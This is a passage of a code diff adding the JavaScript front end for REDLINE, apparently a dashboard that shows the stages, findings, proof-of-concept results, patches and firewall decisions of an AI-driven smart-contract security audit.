+    case "input_quarantined": st.quarantines.push(e); break;
+    case "llm_call": st.llm.push(e); break;
+    case "run_finished": st.finished = e; break;
+  }
+  return st;
+}
+
+function fromEvents(events) {
+  const st = emptyState();
+  for (const e of events) reduce(st, e);
+  return st;
+}
+
+function totals(st) {
+  const tok = st.llm.reduce((a, c) => a + c.prompt_tokens + c.completion_tokens, 0);
+  const providers = [...new Set(st.llm.map((c) => c.provider).concat(st.run ? [st.run.provider] : []))];
+  const confirmed = st.order.filter((id) => st.findings[id].attempts.some((a) => a.confirmed)).length;
+  const fixed = st.order.filter((id) => st.findings[id].patch?.applied).length;
+  const dur = st.finished ? st.finished.duration_s : (st.tNow && st.t0 ? st.tNow - st.t0 : 0);
+  return {
+    findings: st.order.filter((id) => st.findings[id].finding).length, confirmed, fixed,
+    tokens: tok, calls: st.llm.length, providers, duration_s: dur,
+    denies: st.fw.filter((f) => f.verdict === "deny").length, allows: st.fw.filter((f) => f.verdict === "allow").length,
+    quarantined: st.quarantines.length,
+  };
+}
+
+function latencyByLayer(st) {
+  const by = {};
+  for (const f of st.fw) (by[f.layer] ||= []).push(f.latency_ms);
+  return Object.entries(by).map(([layer, a]) => {
+    a.sort((x, y) => x - y);
+    const sum = a.reduce((x, y) => x + y, 0);
+    return { layer, n: a.length, mean: sum / a.length, p50: a[Math.floor(a.length / 2)], max: a[a.length - 1] };
+  }).sort((x, y) => x.layer.localeCompare(y.layer));
+}
+
+
+
+const fmtDur = (s) => (s >= 60 ? `${Math.floor(s / 60)}m ${Math.round(s % 60)}s` : `${s.toFixed(1)}s`);
+const fmtMs = (ms) => (ms >= 100 ? `${ms.toFixed(0)}ms` : `${ms.toFixed(2)}ms`);
+const SEV = { critical: 0, high: 1, medium: 2, low: 3, info: 4 };
+
+function banner(st) {
+  if (!st.run?.scripted) return "";
+  return `<div class="banner"><b>SAMPLE &mdash; scripted model.</b> Model text in this run was replayed
+    from a script, not produced by an LLM. Forge execution, the scanner and the firewall are real.
+    Token counts are 0 because no model was called.</div>`;
+}
+
+function header(st) {
+  const t = totals(st), r = st.run;
+  if (!r) return `<div class="hdr"><div class="muted">waiting for run&hellip;</div></div>`;
+  const state = st.finished ? (st.finished.ok ? "finished" : "failed") : "running";
+  const cell = (k, v, cls = "") => `<div class="stat ${cls}"><div class="k">${k}</div><div class="v">${v}</div></div>`;
+  return `<div class="hdr">
+    <div class="hdr-top"><h1>${esc(r.repo)}</h1><span class="pill ${state}">${state}</span></div>
+    <div class="stats">
+      ${cell("findings", t.findings)}
+      ${cell("confirmed", t.confirmed, t.confirmed ? "red" : "")}
+      ${cell("patched", t.fixed, t.fixed ? "green" : "")}
+      ${cell("fw denied", t.denies, t.denies ? "red" : "")}
+      ${cell("quarantined", t.quarantined, t.quarantined ? "red" : "")}
+      ${cell("duration", fmtDur(t.duration_s))}
+      ${cell("tokens", t.tokens.toLocaleString() + (t.calls ? ` <small>(${t.calls} calls)</small>` : ""))}
+      ${cell("cost", "n/a <small>no pricing configured</small>")}
+      ${cell("providers", esc(t.providers.join(", ") || "-"))}
+    </div></div>`;
+}
+
+const STAGE_LABEL = { baseline: "Baseline", scan: "Scan", recon: "Recon", research: "Research", exploit: "Exploit", patch: "Patch" };
+function stepper(st) {
+  return `<div class="stepper">${STAGES.map((s, i) => {
+    const x = st.stages[s];
+    const n = x.runs.length, ok = x.runs.filter((r) => r.status === "ok").length;
+    const meta = x.status === "pending" ? (st.finished ? "not run" : "pending") : n > 1 || ["research", "exploit", "patch"].includes(s) ? `${ok}/${n}` : x.status;
+    return `<div class="step ${x.status}"><div class="dot">${x.status === "ok" ? "&#10003;" : x.status === "fail" ? "&#10005;" : i + 1}</div>
+      <div class="lbl">${STAGE_LABEL[s]}<small>${meta}</small></div></div>`;
+  }).join("")}</div>`;
+}
+
+function sevChip(s) { return `<span class="sev sev-${esc(s)}">${esc(s)}</span>`; }
+
+function findingStatus(f) {
+  if (f.attempts.some((a) => a.confirmed)) return ["confirmed", "CONFIRMED", "red"];
+  if (f.attempts.length && f.stage.exploit && f.stage.exploit !== "running") return ["unconfirmed", "UNCONFIRMED", "grey"];
+  if (f.stage.exploit === "running") return ["testing", "TESTING PoC", "amber"];
+  return ["suspected", "SUSPECTED", "grey"];
+}
+
+function findingCards(st) {
+  const ids = st.order.filter((id) => st.findings[id].finding)
+    .sort((a, b) => SEV[st.findings[a].finding.severity] - SEV[st.findings[b].finding.severity]);
+  if (!ids.length) return `<div class="empty">No findings yet.</div>`;
+  return ids.map((id) => {
+    const f = st.findings[id], fd = f.finding, [, label, col] = findingStatus(f);
+    const step = (name, key) => {
+      const v = f.stage[key];
+      return `<span class="mini ${v || "pending"}">${name}</span>`;
+    };
+    const patch = f.patch ? (f.patch.applied ? `<span class="mini ok">patched</span>` : `<span class="mini fail">patch failed</span>`) : "";
+    return `<div class="card finding ${col}"><div class="row">${sevChip(fd.severity)}<b>${esc(fd.title)}</b>
+      <span class="chip ${col}">${label}</span></div>
+      <div class="muted mono">${esc(fd.file)}${fd.function ? " :: " + esc(fd.function) : ""}</div>
+      <p>${esc(fd.description)}</p>
+      <div class="minis">${step("research", "research")}${step("exploit", "exploit")}${patch || step("patch", "patch")}
+      <span class="muted">${f.attempts.length ? f.attempts.length + " PoC attempt(s)" : ""}</span></div></div>`;
+  }).join("");
+}
+
+function fwFeed(st, limit = 200) {
+  if (!st.fw.length) return `<div class="empty">No firewall activity yet.</div>`;
+  const t0 = st.t0;
+  return `<div class="feed">${[...st.fw].reverse().slice(0, limit).map((f) => `
+    <div class="fw ${f.verdict}"><span class="vd">${f.verdict === "deny" ? "DENY" : "ALLOW"}</span>
+    <span class="chip lay">${esc(f.layer)}</span><span class="mono act">${esc(f.kind)} ${esc(f.action)}</span>
+    <span class="why">${esc(f.rule)} &mdash; ${esc(f.reason)}</span>
+    <span class="meta">${fmtMs(f.latency_ms)}${f.provider ? " &middot; " + esc(f.provider) : ""} &middot; +${(f.ts - t0).toFixed(1)}s</span></div>`).join("")}</div>`;
+}
+
+function live(st) {
+  return `${stepper(st)}<div class="cols"><section><h2>Findings</h2>${findingCards(st)}</section>
+    <section><h2>Firewall <small>${st.fw.length} decisions</small></h2>${fwFeed(st)}</section></div>`;
+}
+
+// ---------------- report ----------------
+function code(html) { return `<pre class="code">${html}</pre>`; }
+
+function reportFinding(st, id, rep) {
+  const f = st.findings[id], fd = f.finding;
+  const [, label, col] = findingStatus(f);
+  const last = f.attempts[f.attempts.length - 1];
+  const attempts = f.attempts.map((a) => `<details ${a === last ? "open" : ""}><summary>
+      <span class="chip ${a.passed ? "red" : "grey"}">attempt ${a.attempt}: ${a.passed ? "exploit works" : a.note?.startsWith("blocked") ? "blocked by firewall" : "did not work"}</span></summary>
+      ${a.note && !a.passed ? `<div class="muted small">${esc(a.note)}</div>` : ""}
+      ${a.output ? code(esc(a.output)) : ""}</details>`).join("");
+  const p = f.patch;
+  const ba = `<div class="ba">
+    <div class="ba-box red"><div class="k">before patch</div><div class="v">${f.attempts.some((a) => a.confirmed) ? "exploit PASSES &rarr; bug confirmed" : "exploit not demonstrated"}</div></div>
+    <div class="arrow">&rarr;</div>
+    <div class="ba-box ${p?.applied ? "green" : "grey"}"><div class="k">after patch</div><div class="v">${p ? (p.applied ? "exploit FAILS &middot; existing suite green" : "patch not accepted") : "no patch attempted"}</div></div></div>`;
+  const cites = f.citations.length ? `<h4>Sources (Tavily)</h4><ul class="cites">${f.citations.map((c) =>
+    `<li><a href="${esc(c.url)}" target="_blank" rel="noopener noreferrer">${esc(c.title || c.url)}</a><div class="muted small">${esc(c.snippet)}</div></li>`).join("")}</ul>` : "";
+  return `<article class="card finding ${col}"><div class="row">${sevChip(fd.severity)}<b>${esc(fd.title)}</b><span class="chip ${col}">${label}</span></div>
+    <div class="muted mono">${esc(fd.file)}${fd.function ? " :: " + esc(fd.function) : ""}</div>
+    <p>${esc(fd.description)}</p><h4>Attack</h4><p>${esc(fd.attack)}</p>
+    ${ba}
+    <h4>Proof of concept <small>${f.attempts.length} attempt(s)</small></h4>${attempts || '<div class="empty">none</div>'}
+    ${last?.code ? `<details open><summary>PoC code (${esc(last.test_file)})</summary>${code(solidity(last.code))}</details>` : ""}
+    ${p?.diff ? `<h4>Patch <small>${p.attempts} attempt(s)</small></h4>${p.note ? `<p class="muted">${esc(p.note)}</p>` : ""}${code(diff(p.diff))}` : ""}
+    ${cites}</article>`;
+}
+
+function report(st, rep) {
+  const ids = st.order.filter((id) => st.findings[id].finding)
+    .sort((a, b) => SEV[st.findings[a].finding.severity] - SEV[st.findings[b].finding.severity]);
+  const llm = {};
+  for (const c of st.llm) { const k = `${c.provider} / ${c.model}`; (llm[k] ||= { n: 0, p: 0, c: 0, s: 0 }); llm[k].n++; llm[k].p += c.prompt_tokens; llm[k].c += c.completion_tokens; llm[k].s += c.latency_s; }
+  const rows = Object.entries(llm).map(([k, v]) => `<tr><td class="mono">${esc(k)}</td><td>${v.n}</td><td>${v.p.toLocaleString()}</td><td>${v.c.toLocaleString()}</td><td>${v.s.toFixed(2)}s</td></tr>`).join("");
+  return `${ids.length ? ids.map((id) => reportFinding(st, id, rep)).join("") : '<div class="empty">No findings.</div>'}
+    <h2>Model calls</h2><div class="tablewrap"><table><tr><th>provider / model</th><th>calls</th><th>prompt tok</th><th>completion tok</th><th>time</th></tr>${rows || '<tr><td colspan="5" class="muted">none</td></tr>'}</table></div>`;
+}
+
+// ---------------- firewall ----------------
+function quarantineFile(file, text, spans) {
+  const lines = text.split("\n");
+  const inSpan = (n) => spans.some((s) => n >= s.start_line && n <= s.end_line);
+  return `<div class="qfile"><div class="qname mono">${esc(file)} <span class="chip red">${spans.length} span(s) quarantined</span></div>
+    <pre class="code qsrc">${lines.map((l, i) => `<span class="ln">${i + 1}</span><span class="${inSpan(i + 1) ? "qhit" : ""}">${esc(l)}</span>`).join("\n")}</pre>
+    ${spans.map((s) => `<div class="muted small">lines ${s.start_line}-${s.end_line}: ${esc(s.detector)} detector &mdash; ${esc(s.reason)}. The agent saw a <code>[REDACTED]</code> placeholder instead.</div>`).join("")}</div>`;
+}
+
+function firewall(st, rep) {
+  const byFile = {};
+  for (const q of st.quarantines) (byFile[q.file] ||= []).push(q);
+  const files = Object.entries(byFile).map(([f, spans]) => {
+    const text = rep?.quarantine_files?.[f];
+    return text ? quarantineFile(f, text, spans) :
+      `<div class="qfile"><div class="qname mono">${esc(f)}</div>${spans.map((s) => `<pre class="code"><span class="qhit">${esc(s.excerpt)}</span></pre><div class="muted small">lines ${s.start_line}-${s.end_line}: ${esc(s.detector)} &mdash; ${esc(s.reason)}</div>`).join("")}</div>`;
+  }).join("");
+  const denied = st.fw.filter((f) => f.verdict === "deny");
+  const lat = latencyByLayer(st);
+  const maxMean = Math.max(...lat.map((l) => l.mean), 0.001);
+  const LNAME = { L1: "L1 deterministic rules", L2: "L2 Nemotron policy", scanner: "scanner" };
+  return `<h2>Quarantined input <small>${st.quarantines.length} span(s)</small></h2>${files || '<div class="empty">Nothing quarantined.</div>'}
+    <h2>Blocked actions <small>${denied.length}</small></h2>
+    ${denied.length ? `<div class="feed">${denied.map((f) => `<div class="fw deny"><span class="vd">DENY</span><span class="chip lay">${esc(f.layer)}</span>
+      <span class="mono act">${esc(f.kind)} ${esc(f.action)}</span><span class="why">${esc(f.rule)} &mdash; ${esc(f.reason)}</span>
+      <span class="meta">${fmtMs(f.latency_ms)}</span></div>`).join("")}</div>` : '<div class="empty">No actions were blocked in this run.</div>'}
+    <h2>Latency by layer</h2><div class="tablewrap"><table><tr><th>layer</th><th>decisions</th><th>mean</th><th>p50</th><th>max</th><th></th></tr>
+    ${lat.map((l) => `<tr><td>${esc(LNAME[l.layer] || l.layer)}</td><td>${l.n}</td><td>${fmtMs(l.mean)}</td><td>${fmtMs(l.p50)}</td><td>${fmtMs(l.max)}</td>
+      <td class="barcell"><div class="bar" style="width:${Math.max(2, (l.mean / maxMean) * 100)}%"></div></td></tr>`).join("") || '<tr><td colspan="6" class="muted">no decisions</td></tr>'}</table></div>`;
+}
+
+
+
+const $ = (s) => document.querySelector(s);
+const EXPORT = window.__REDLINE_DATA__ || null;
+let st = emptyState(), rep = null, view = "live", es = null, runs = [], runId = null, timer = null;
+
+function shell() {
+  $("#app").innerHTML = `<header class="top"><div class="brand"><span class="logo">&#9632;</span> REDLINE</div>
+    <div class="ctl">${EXPORT ? "" : `<select id="runsel"></select>`}<button id="replay" title="Replay this run">&#9654; Replay</button></div></header>
+    <nav class="tabs"><button data-v="live">Live</button><button data-v="report">Report</button><button data-v="firewall">Firewall</button></nav>
+    <main><div id="banner"></div><div id="hdr"></div><div id="view"></div></main>`;
+  document.querySelectorAll(".tabs button").forEach((b) => b.onclick = () => { view = b.dataset.v; history.replaceState(null, "", `#${runId || ""}/${view}`); paint(); });
+  $("#replay").onclick = () => start(true);
+  if (!EXPORT) $("#runsel").onchange = (e) => { runId = e.target.value; history.replaceState(null, "", `#${runId}/${view}`); start(true); };
+}
+
+let raf = 0;
+function schedule() { if (!raf) raf = requestAnimationFrame(() => { raf = 0; paint(); }); }
+function paint() {
+  document.querySelectorAll(".tabs button").forEach((b) => b.classList.toggle("on", b.dataset.v === view));
+  $("#banner").innerHTML = banner(st);
+  $("#hdr").innerHTML = header(st);
+  const v = $("#view"), y = window.scrollY;
+  v.innerHTML = view === "live" ? live(st) : view === "report" ? report(st, rep) : firewall(st, rep);
+  window.scrollTo(0, y);
+}
+
+function clamp(d) { return Math.min(Math.max(d, 0.15), 2.5); }
+
+function replayLocal(events) {
+  st = emptyState();
+  let i = 0, prev = null;
+  const next = () => {
+    if (i >= events.length) return;
+    const e = events[i++];
+    const wait = prev === null ? 0 : clamp(e.ts - prev) * 1000;
+    prev = e.ts;
+    timer = setTimeout(() => { reduce(st, e); schedule(); next(); }, wait);
+  };
+  next();
+}
+
+async function start(replay) {
+  if (es) { es.close(); es = null; }
+  clearTimeout(timer);
+  st = emptyState(); rep = null; paint();
+  if (EXPORT) { rep = EXPORT.report; replay ? replayLocal(EXPORT.events) : (st = fromEvents(EXPORT.events), paint()); return; }
+  if (!runId) return;
+  const data = await (await fetch(`/runs/${encodeURIComponent(runId)}`)).json();
+  rep = data.report;
+  es = new EventSource(`/runs/${encodeURIComponent(runId)}/stream`);
+  const types = ["run_started", "stage_started", "stage_finished", "finding_added", "poc_result", "patch_result", "firewall_decision", "input_quarantined", "llm_call", "run_finished"];
+  for (const t of types) es.addEventListener(t, (m) => { reduce(st, JSON.parse(m.data)); schedule(); });
+  es.addEventListener("end", () => { es.close(); fetch(`/runs/${encodeURIComponent(runId)}`).then((r) => r.json()).then((d) => { rep = d.report; schedule(); }); });
+}
+
+async function boot() {
+  shell();
+  const [h, v] = location.hash.slice(1).split("/");
+  if (["live", "report", "firewall"].includes(v)) view = v;
+  if (EXPORT) { runId = EXPORT.id; st = fromEvents(EXPORT.events); rep = EXPORT.report; paint(); return; }
+  runs = await (await fetch("/runs")).json();
+  $("#runsel").innerHTML = runs.map((r) => `<option value="${r.id}">${r.id}${r.scripted ? " (SAMPLE)" : ""} - ${r.status}</option>`).join("");
+  runId = runs.find((r) => r.id === h)?.id || runs[0]?.id;
+  if (runId) $("#runsel").value = runId;
+  if (!runId) { $("#view").innerHTML = `<div class="empty">No runs yet. Run <code>redline audit</code> or <code>python scripts/gen_samples.py</code>.</div>`; return; }
+  start(true);
+}
+boot();
+
+})();</script></body></html>
